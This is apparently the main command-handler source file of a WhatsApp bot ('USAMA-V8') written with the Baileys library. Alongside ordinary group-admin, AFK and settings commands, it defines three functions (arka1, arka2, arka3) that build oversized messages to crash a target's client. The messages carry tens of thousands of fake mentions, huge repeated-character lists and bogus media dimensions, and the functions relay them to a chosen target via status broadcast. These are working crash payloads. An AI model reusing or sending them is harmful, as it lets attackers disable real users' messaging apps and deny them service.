const { default: makeWaSocket, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const NodeCache = require("node-cache");
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { ytsearch, ytmp3, ytmp4 } = require('@dark-yasiya/yt-dl.js'); 
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")

//bug database

//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autorep
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

//time

module.exports = Usama = async (Usama, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreply.selectedRowId : (m.mtype == 'templateButtonreplyMessage') ? m.message.templateButtonreplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await Usama.decodeJid(Usama.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await Usama.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const creators = require('./Creator'); // Importing creator numbers

const isCreator = m && m.sender && creators
    .some(v => m.sender === v + '@s.whatsapp.net');
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        expiredCheck(Usama, m, premium);
//group chat msg by xeon
const reply = (teks) => {
let Toxxiconrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "υѕαмα  dнυddi  нєяє💫💗",
newsletterJid: "120363359467682362@newsletter",
},
externalAdReply: {  
showAdAttribution: false,
title: global.botname, 
body: global.ownername,
thumbnailUrl: 'https://files.catbox.moe/oolnnr.jpg',
sourceUrl: link
},
},
text: teks,
}
return Usama.sendMessage(from, Toxxiconrep, {
quoted: m,
})
}

//bug functions


const xeonimun = (texto) => {
Usama.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}

//end bug functions

async function loading () {
    var clockEmojis = [
        "🕛", "🕐", "🕑", "🕒", "🕓", "🕔", "🕕", "🕖", "🕗"
    ];

    let { key } = await Usama.sendMessage(from, { text: '⏳ ᴏᴘᴇɴɪɴɢ...' });

    for (let round = 0; round < 2; round++) {
        for (let i = 0; i < clockEmojis.length; i++) {
            await Usama.sendMessage(from, { text: clockEmojis[i], edit: key });
            await new Promise(res => setTimeout(res, 400));  // Adjust time delay for smooth transition
        }
    }

    await Usama.sendMessage(from, { text: '✅ ᴄᴏᴍᴘʟᴇᴛᴇ' , edit: key });
}



        if (!Usama.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            Usama.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        Usama.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        Usama.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        Usama.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        Usama.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            Usama.updateProfileStatus(`USAMA-V8 is always online....!`).catch(_ => _)
        }
        
 
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        



        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    reply(`Don't tag him,\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                Usama.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        
        
        
async function arka3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u200D".repeat(1000),
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            target, "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await Usama.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Usama.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

    
    
    async function arka2(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "Come here kiddo - AmbaCrash",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await Usama.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Usama.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "@arka" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
    
async function arka1(target, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "@ᵘˢᵃᵐᵃ ᵈʰᵘᵈᵈⁱ",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( # )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(target, MSG, {});

await Usama.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await Usama.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 𝗨𝘀𝗮𝗺𝗮-𝗖𝗿𝗮𝘀𝗵" },
content: undefined
}
]
}
);
}
}


        switch (command) {
        
        
        

            case 'listprem': {
                if (!isCreator) return reply(mess.owner)
                let data = require("./Creator.js")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                }                
                Usama.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return reply(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    reply(teks)
                    await sleep(2000)
                    reply("Delete junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    reply("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!isCreator) return reply(mess.owner)
                    if (!text) return reply('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
                    reply(mess.wait)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await Usama.groupAcceptInvite(result).then((res) => reply(json(res))).catch((err) => reply(json(err)))
                } catch {
                    reply('Failed to join the Group')
                }
                break      
            case 'getsession':
                if (!isCreator) return reply(mess.owner)
                reply('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                Usama.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
            case 'shutdown':
                if (!isCreator) return reply(mess.owner)
                reply(`Goodbye🖐`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return reply(mess.owner)
                reply('In Process....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    reply(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    reply(`Successfully changed autoread to ${q}`)
                }
                break
                case 'autotyping':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    reply(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    reply(`Successfully changed auto-typing to ${q}`)
                }
                break
                case 'autorecording':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    reply(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    reply(`Successfully changed auto-recording to ${q}`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
         
         reply(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    reply(`Successfully changed auto recording and typing to ${q}`)
                }
                break
               
    case 'autostatusview':{
             if (!isCreator) return reply(mess.owner)
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  reply(`${command} is disabled`)
               }
            }
            break
            case 'autobio':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    reply(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    reply(`Successfully Changed AutoBio To ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    Usama.public = true
                    reply(mess.done)
                } else if (q == 'self') {
                    Usama.public = false
                    reply(mess.done)
                }
                break
            
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return reply(mess.owner)
                if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await Usama.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await Usama.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                } else {
                    var memeg = await Usama.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                }
                break
            case 'block':
                if (!isCreator) return reply(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Usama.updateBlockStatus(blockw, 'block').then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'unblock':
                if (!isCreator) return reply(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Usama.updateBlockStatus(blockww, 'unblock').then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'leave':
                if (!isCreator) return reply(mess.owner)
                if (!m.isGroup) return reply(mess.group)
                reply('Bye Everyone 🥺')
                await Usama.groupLeave(m.chat)
                break

            
            case 'getcase':
                if (!isCreator) return reply(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("usama8.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                reply(`${getCase(q)}`)
                break
                case 'addcase': {
  // Send a sequence of clock reactions to indicate progress
  await Usama.sendMessage(m.chat, { react: { text: "🕛", key: m.key } })
  await Usama.sendMessage(m.chat, { react: { text: "🕒", key: m.key } })
  await Usama.sendMessage(m.chat, { react: { text: "🕕", key: m.key } })
  await Usama.sendMessage(m.chat, { react: { text: "🕘", key: m.key } })
  await Usama.sendMessage(m.chat, { react: { text: "✅️", key: m.key } })

  // Only allow the bot owner to run this
  if (!isCreator) return reply('Only the Bot Creator is allowed')

  // Make sure there's a case to add
  if (!text) return reply('Where is the case?');

  const fs = require('fs');
  const fileName = 'usama8.js';
  const newCase = `${text}`;

  // Read the current file
  fs.readFile(fileName, 'utf8', (err, data) => {
    if (err) {
      console.error('An error occurred while reading the file:', err);
      return;
    }

    // Find the position of the 'addcase' case in the file
    const startOfAddCase = data.indexOf("case 'addcase':");

    if (startOfAddCase !== -1) {
      // Insert the new case before the existing 'addcase' case
      const fullNewCode = data.slice(0, startOfAddCase) + '\n' + newCase + '\n' + data.slice(startOfAddCase);
      
      // Write the updated content back to the file
      fs.writeFile(fileName, fullNewCode, 'utf8', (err) => {
        if (err) {
          reply('An error occurred while writing to the file:', err);
        } else {
         reply('New case added successfully.');
        }
      });
    } else {
      reply('Cannot add the case to the file.');
    }
  });
}
break


case 'delcase': {
  if (!isCreator) return reply(`*Access Denied ❌*\n\n*Creators only*`)
  if (!q) return reply('*Enter the name of the case you want to delete*')

  dellCase('./usama8.js', q)
  reply('*Case deleted successfully*\n\n© Deleted by Muhammad Hilmy')
}
break

            case 'delete':
            case 'del': {
                if (!isCreator) return reply(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return reply('The message was not sent by a bot!')
                Usama.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            
            case 'kick':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Usama.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'add':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Usama.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Usama.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Usama.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!text) return 'Text ?'
                await Usama.groupUpdateSubject(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(json(err)))
                break
            case 'setdesc':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!text) return 'Text ?'
                await Usama.groupUpdateDescription(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await Usama.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await Usama.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                } else {
                    var memeg = await Usama.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                let teks = `*👥 Tag All*
 
                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                Usama.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
